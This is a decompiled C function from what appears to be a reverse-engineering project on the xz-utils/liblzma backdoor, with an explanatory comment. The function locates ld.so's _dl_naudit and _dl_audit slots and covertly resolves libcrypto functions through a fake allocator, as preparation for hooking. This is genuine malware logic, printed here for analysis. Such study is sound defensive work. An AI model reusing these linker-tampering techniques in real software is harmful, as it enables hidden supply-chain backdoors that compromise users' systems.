// /home/kali/xzre-ghidra/xzregh/104370_find_dl_naudit.c
// Function: find_dl_naudit @ 0x104370
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_dl_naudit(elf_info_t * dynamic_linker_elf, elf_info_t * libcrypto_elf, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Harvests the `_dl_naudit` counter and `_dl_audit` pointer from ld.so so the loader can toggle audit modules. After resolving
 * `DSA_get0_pqg`, `DSA_get0_pub_key`, and `EVP_MD_CTX_free` via the fake allocator, it finds `rtld_global_ro`, searches for the
 * `GLRO(dl_naudit)` string reference, and decodes the MOV that loads that slot. The same memory address is then matched inside
 * `_dl_audit_symbind_alt`; if the MOV/TEST pair is found and the slot is still zero, the function records the `_dl_naudit` and
 * `_dl_audit` pointers in `hooks->ldso_ctx`. Any deviation or pre-existing audit module aborts the attempt.
 */

#include "xzre_types.h"

BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
                   backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)

{
  Elf64_Addr EVar1;
  Elf64_Ehdr *pEVar2;
  Elf64_Xword EVar3;
  dl_audit_symbind_alt_fn code_start;
  BOOL success;
  Elf64_Sym *pEVar5;
  char *str;
  Elf64_Sym *dsa_get0_pqg_symbol;
  u8 *string_ref;
  uchar *rtld_global_ro_ptr;
  lzma_allocator *allocator;
  pfn_EVP_MD_CTX_free_t evp_md_ctx_free_fn;
  uint *slot_ptr;
  pfn_DSA_get0_pub_key_t dsa_get0_pub_key_fn;
  long lVar12;
  dasm_ctx_t *dasm_cursor;
  u8 *scan_cursor;
  uint *mem_address;
  byte bVar14;
  EncodedStringId local_8c;
  u64 local_88;
  dasm_ctx_t local_80;
  
  bVar14 = 0;
  local_8c = 0;
  local_88 = 0;
  pEVar5 = elf_symbol_get(dynamic_linker_elf,STR_rtld_global_ro,0);
  if (pEVar5 != (Elf64_Sym *)0x0) {
    local_8c = STR_GLRO_dl_naudit_naudit;
    str = elf_find_string(dynamic_linker_elf,&local_8c,(void *)0x0);
    if (str != (char *)0x0) {
      dsa_get0_pqg_symbol = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
      string_ref = (u8 *)elf_get_code_segment(dynamic_linker_elf,&local_88);
      if ((string_ref != (u8 *)0x0) &&
         (string_ref = find_string_reference(string_ref,string_ref + local_88,str), string_ref != (u8 *)0x0)) {
        if (dsa_get0_pqg_symbol != (Elf64_Sym *)0x0) {
          EVar1 = dsa_get0_pqg_symbol->st_value;
          pEVar2 = libcrypto_elf->elfbase;
          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          imported_funcs->DSA_get0_pqg = (pfn_DSA_get0_pqg_t)(pEVar2->e_ident + EVar1);
        }
        dasm_cursor = &local_80;
        for (lVar12 = 0x16; lVar12 != 0; lVar12 = lVar12 + -1) {
          *(undefined4 *)&dasm_cursor->instruction = 0;
          dasm_cursor = (dasm_ctx_t *)((long)dasm_cursor + (ulong)bVar14 * -8 + 4);
        }
        rtld_global_ro_ptr = dynamic_linker_elf->elfbase->e_ident + pEVar5->st_value;
        EVar3 = pEVar5->st_size;
        allocator = get_lzma_allocator();
        allocator->opaque = libcrypto_elf;
        evp_md_ctx_free_fn = (pfn_EVP_MD_CTX_free_t)lzma_alloc(0xd10,allocator);
        imported_funcs->EVP_MD_CTX_free = evp_md_ctx_free_fn;
        if (evp_md_ctx_free_fn != (pfn_EVP_MD_CTX_free_t)0x0) {
          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        }
        mem_address = (uint *)0x0;
        scan_cursor = string_ref + -0x80;
        while (scan_cursor < string_ref) {
          success = find_instruction_with_mem_operand_ex
                            (scan_cursor,string_ref,&local_80,0x10b,(void *)0x0);
          scan_cursor = scan_cursor + 1;
          if (success != FALSE) {
            if ((local_80.prefix.decoded.flags2 & 1) != 0) {
              slot_ptr = (uint *)local_80.mem_disp;
              if (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                slot_ptr = (uint *)((u8 *)(local_80.mem_disp + (long)local_80.instruction) +
                                  local_80.instruction_size);
              }
              if (((((byte)local_80.prefix.decoded.rex & 0x48) != 0x48) && (rtld_global_ro_ptr < slot_ptr)) &&
                 (slot_ptr + 1 <= rtld_global_ro_ptr + EVar3)) {
                mem_address = slot_ptr;
              }
            }
            scan_cursor = local_80.instruction + (ulong)local_80.insn_offset + 1;
          }
        }
        if ((mem_address == (uint *)0x0) ||
           (code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt,
           success = find_instruction_with_mem_operand_ex
                             ((u8 *)code_start,
                              (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                              (dasm_ctx_t *)0x0,0x10b,mem_address), success == FALSE)) {
          dsa_get0_pub_key_fn = (pfn_DSA_get0_pub_key_t)imported_funcs->EVP_MD_CTX_free;
        }
        else {
          dsa_get0_pub_key_fn = (pfn_DSA_get0_pub_key_t)lzma_alloc(0x468,allocator);
          imported_funcs->DSA_get0_pub_key = dsa_get0_pub_key_fn;
          if (dsa_get0_pub_key_fn != (pfn_DSA_get0_pub_key_t)0x0) {
            imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          }
          if ((*mem_address == 0) && (*(long *)(mem_address + -2) == 0)) {
            (hooks->ldso_ctx)._dl_naudit_ptr = mem_address;
            (hooks->ldso_ctx)._dl_audit_ptr = (audit_ifaces **)(mem_address + -2);
            return TRUE;
          }
          lzma_free(imported_funcs->EVP_MD_CTX_free,allocator);
          dsa_get0_pub_key_fn = imported_funcs->DSA_get0_pub_key;
        }
        lzma_free(dsa_get0_pub_key_fn,allocator);
      }
    }
  }
  return FALSE;
}

